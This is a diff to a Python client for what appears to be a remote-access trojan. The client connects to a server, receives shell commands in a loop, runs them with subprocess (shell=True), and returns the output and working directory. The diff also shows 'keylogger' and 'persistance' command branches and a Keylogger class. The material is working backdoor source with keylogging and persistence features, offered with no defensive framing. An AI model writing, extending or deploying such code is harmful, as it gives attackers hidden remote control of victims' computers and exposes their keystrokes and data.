@@ -4,6 +4,8 @@
 
     keylogger_mode = "null"
 
+    result_commande = ""
+
     def run(self):
 
         ClientSocket = socket.socket()
@@ -33,7 +35,12 @@
 
         while True:
             # receive the command from the server
-            command = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
+            try:
+                command = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
+            except socket.error as e:
+                print(str(e))
+                break
+            #command = ClientSocket.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
             splited_command = command.split()
             print(command)
             #output = subprocess.getoutput(command)
@@ -107,10 +114,23 @@
                     output = ""
             elif splited_command[0].lower() != "keylogger" and splited_command[0].lower() != "persistance":
                 # execute the command and retrieve the results
+
+                """
+                thread = threading.Thread(target=Commande, args=(command,))
+                thread.start()
+                thread.join()
+                """
+
+                output = self.Commande(command)
+                
+                
+                print("commande effectuer")
+                """"
                 resCmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,)
                 output, err = resCmd.communicate()
                 output = output.decode('cp850')
-                print("commande effectuer")
+                """
+                
             # get the current working directory as output
             cwd = os.getcwd()
             # send the results back to the server
@@ -127,6 +147,20 @@
         ## Fin de Connection ##
 
         ClientSocket.close()
+
+    def LaunchThread(self, fonction, arg1 = ""):
+        print(fonction)
+        t = Threads()
+        t.StartThread(fonction, arg1)
+        return t
+
+    def Commande(self,cmd):
+        resCmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stdin=subprocess.DEVNULL, stderr=subprocess.PIPE,)
+        output, err = resCmd.communicate()
+        output = output.decode('cp850')
+        payload.result_commande = output
+        return output
+
 
 class Keylogger:
 
